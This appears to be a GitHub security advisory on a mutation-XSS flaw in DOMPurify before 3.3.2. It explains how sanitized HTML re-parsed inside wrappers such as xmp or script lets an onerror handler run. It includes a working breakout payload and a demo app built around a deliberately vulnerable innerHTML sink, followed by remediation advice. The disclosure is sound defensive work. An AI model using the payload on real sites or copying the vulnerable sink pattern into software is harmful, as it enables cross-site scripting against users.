# [M] DOMPurify is vulnerable to mutation-XSS via Re-Contextualization 

## Summary
Severity: Medium
Advisory: GHSA-h8r8-wccr-v5f2
CVE: CVE-2026-65914
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-h8r8-wccr-v5f2
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=0 <3.3.2

## Details
## Description

A mutation-XSS (mXSS) condition was confirmed when sanitized HTML is reinserted into a new parsing context using `innerHTML` and special wrappers. The vulnerable wrappers confirmed in browser behavior are `script`, `xmp`, `iframe`, `noembed`, `noframes`, and `noscript`. The payload remains seemingly benign after `DOMPurify.sanitize()`, but mutates during the second parse into executable markup with an event handler, enabling JavaScript execution in the client (`alert(1)` in the PoC).


## Vulnerability

The root cause is context switching after sanitization: sanitized output is treated as trusted and concatenated into a wrapper string (for example, `<xmp> ... </xmp>` or other special wrappers) before being reparsed by the browser. In this flow, attacker-controlled text inside an attribute (for example `</xmp>` or equivalent closing sequences for each wrapper) closes the special parsing context early and reintroduces attacker markup (`<img ... onerror=...>`) outside the original attribute context. DOMPurify sanitizes the original parse tree, but the application performs a second parse in a different context, reactivating dangerous tokens (classic mXSS pattern).

## PoC

1. Start the PoC app:
```bash
npm install
npm start
```

2. Open `http://localhost:3001`.
3. Set `Wrapper en sink` to `xmp`.
4. Use payload:
```html
 <img src=x alt="</xmp><img src=x onerror=alert('expoc')>">
```

5. Click `Sanitize + Render`.
6. Observe:
- `Sanitized response` still contains the `</xmp>` sequence inside `alt`.
- The sink reparses to include `<img src="x" onerror="alert('expoc')">`.
- `alert('expoc')` is triggered.
7. Files:
- index.html

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>expoc - DOMPurify SSR PoC</title>
    <style>
      :root {
        --bg: #f7f8fb;
        --panel: #ffffff;
        --line: #d8dce6;
        --text: #0f172a;
        --muted: #475569;
        --accent: #0ea5e9;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        font-family: "SF Mono", Menlo, Consolas, monospace;
        color: var(--text);
        background: radial-gradient(circle at 10% 0%, #e0f2fe 0%, var(--bg) 60%);
      }

      main {
        max-width: 980px;
        margin: 28px auto;
        padding: 0 16px 20px;
      }

      h1 {
        margin: 0 0 10px;
        font-size: 1.45rem;
      }

      p {
        margin: 0;
        color: var(--muted);
      }

      .grid {
        display: grid;
        gap: 14px;
        margin-top: 16px;
      }

      .card {
        background: var(--panel);
        border: 1px solid var(--line);
        border-radius: 12px;
        padding: 14px;
      }

      label {
        display: block;
        margin-bottom: 7px;
        font-size: 0.85rem;
        color: var(--muted);
      }

      textarea,
      input,
      select,
      button {
        width: 100%;
        border: 1px solid var(--line);
        border-radius: 8px;
        padding: 9px 10px;
        font: inherit;
        background: #fff;
      }

      textarea {
        min-height: 110px;
        resize: vertical;
      }

      .row {
        display: grid;
        grid-template-columns: 1fr 230px;
        gap: 12px;
      }

      button {
        cursor: pointer;
        background: var(--accent);
        color: #fff;
        border-color: #0284c7;
      }

      #sink {
        min-height: 90px;
        border: 1px dashed #94a3b8;
        border-radius: 8px;
        padding: 10px;
        background: #f8fafc;
      }

      pre {
        margin: 0;
        white-space: pre-wrap;
        word-break: break-word;
      }

      .note {
        margin-top: 8px;
        font-size: 0.85rem;
      }

      .status-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
        gap: 8px;
        margin-top: 10px;
      }

      .status-item {
        border: 1px solid var(--line);
        border-radius: 8px;
        padding: 8px 10px;
        font-size: 0.85rem;
        background: #fff;
      }

      .status-item.vuln {
        border-color: #ef4444;
        background: #fef2f2;
      }

      .status-item.safe {
        border-color: #22c55e;
        background: #f0fdf4;
      }

      @media (max-width: 760px) {
        .row {
          grid-template-columns: 1fr;
        }
      }
    </style>
  </head>
  <body>
    <main>
      <h1>expoc - DOMPurify Server-Side PoC</h1>
      <p>
        Flujo: input -> POST /sanitize (Node + jsdom + DOMPurify) -> render vulnerable con innerHTML.
      </p>

      <div class="grid">
        <section class="card">
          <label for="payload">Payload</label>
          <textarea id="payload"><img src=x alt="</script><img src=x onerror=alert('expoc')>"></textarea>
          <div class="row" style="margin-top: 10px;">
            <div>
              <label for="wrapper">Wrapper en sink</label>
              <select id="wrapper">
                <option value="div">div</option>
                <option value="textarea">textarea</option>
                <option value="title">title</option>
                <option value="style">style</option>
                <option value="script" selected>script</option>
                <option value="xmp">xmp</option>
                <option value="iframe">iframe</option>
                <option value="noembed">noembed</option>
                <option value="noframes">noframes</option>
                <option value="noscript">noscript</option>
              </select>
            </div>
            <div style="display:flex;align-items:end;">
              <button id="run" type="button">Sanitize + Render</button>
            </div>
          </div>
          <p class="note">Se usa render vulnerable: <code>sink.innerHTML = '&lt;wrapper&gt;' + sanitized + '&lt;/wrapper&gt;'</code>.</p>
          <div class="status-grid">
            <div class="status-item vuln">script (vulnerable)</div>
            <div class="status-item vuln">xmp (vulnerable)</div>
            <div class="status-item vuln">iframe (vulnerable)</div>
            <div class="status-item vuln">noembed (vulnerable)</div>
            <div class="status-item vuln">noframes (vulnerable)</div>
            <div class="status-item vuln">noscript (vulnerable)</div>
            <div class="status-item safe">div (no vulnerable)</div>
            <div class="status-item safe">textarea (no vulnerable)</div>
            <div class="status-item safe">title (no vulnerable)</div>
            <div class="status-item safe">style (no vulnerable)</div>
          </div>
        </section>

        <section class="card">
          <label>Sanitized response</label>
          <pre id="sanitized">(empty)</pre>
        </section>

        <section class="card">
          <label>Sink</label>
          <div id="sink"></div>
        </section>
      </div>
    </main>

    <script>
      const payload = document.getElementById('payload');
      const wrapper = document.getElementById('wrapper');
      const run = document.getElementById('run');
      const sanitizedNode = document.getElementById('sanitized');
      const sink = document.getElementById('sink');

      run.addEventListener('click', async () => {
        const response = await fetch('/sanitize', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ input: payload.value })
        });

        const data = await response.json();
        const sanitized = data.sanitized || '';
        const w = wrapper.value;

        sanitizedNode.textContent = sanitized;
        sink.innerHTML = '<' + w + '>' + sanitized + '</' + w + '>';
      });
    </script>
  </body>
</html>
```

- server.js

```js
const express = require('express');
const path = require('path');
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const app = express();
const port = process.env.PORT || 3001;

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'expoc' });
});

app.post('/sanitize', (req, res) => {
  const input = typeof req.body?.input === 'string' ? req.body.input : '';
  const sanitized = DOMPurify.sanitize(input);
  res.json({ sanitized });
});

app.listen(port, () => {
  console.log(`expoc running at http://localhost:${port}`);
});
```

- package.json

```json
{
  "name": "expoc",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "start": "node server.js",
    "dev": "node server.js"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "description": "",
  "dependencies": {
    "dompurify": "^3.3.1",
    "express": "^5.2.1",
    "jsdom": "^28.1.0"
  }
}
```

## Evidence

- PoC

[daft-video.webm](https://github.com/user-attachments/assets/499a593d-0241-4ab8-95a9-cf49a00bda90)

- XSS triggered
<img width="2746" height="1588" alt="daft-img" src="https://github.com/user-attachments/assets/1f463c14-d5a3-4c93-94e4-12d2d02c7d15" />

## Why This Happens
This is a mutation-XSS pattern caused by a parse-context mismatch:

- Parse 1 (sanitization phase): input is interpreted under normal HTML parsing rules.
- Parse 2 (sink phase): sanitized output is embedded into a wrapper that changes parser state (`xmp` raw-text behavior).
- Attacker-controlled sequence (`</xmp>`) gains structural meaning in parse 2 and alters DOM structure.

Sanitization is not a universal guarantee across all future parsing contexts. The sink design reintroduces risk.

## Remediation Guidance
1. Do not concatenate sanitized strings into new HTML wrappers followed by `innerHTML`.
2. Keep the rendering context stable from sanitize to sink.
3. Prefer DOM-safe APIs (`textContent`, `createElement`, `setAttribute`) over string-based HTML composition.
4. If HTML insertion is required, sanitize as close as possible to final insertion context and avoid wrapper constructs with raw-text semantics (`xmp`, `script`, etc.).
5. Add regression tests for context-switch/mXSS payloads (including `</xmp>`, `</noscript>`, similar parser-breakout markers).

Reported by Oscar Uribe, Security Researcher at Fluid Attacks. Camilo Vera and Cristian Vargas from the Fluid Attacks Research Team have identified a mXSS via Re-Contextualization in DomPurify 3.3.1.

Following Fluid Attacks [Disclosure Policy](https://fluidattacks.com/advisories/policy), if this report corresponds to a vulnerability and the conditions outlined in the policy are met, this advisory will be published on the website over the next few days (the timeline may vary depending on maintainers' willingness to attend to and respond to this report) at the following URL: https://fluidattacks.com/advisories/daft

Acknowledgements: [Camilo Vera](https://github.com/caverav/) and [Cristian Vargas](https://github.com/tachote).

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-h8r8-wccr-v5f2
- https://github.com/cure53/DOMPurify
- https://github.com/cure53/DOMPurify/releases/tag/3.3.2
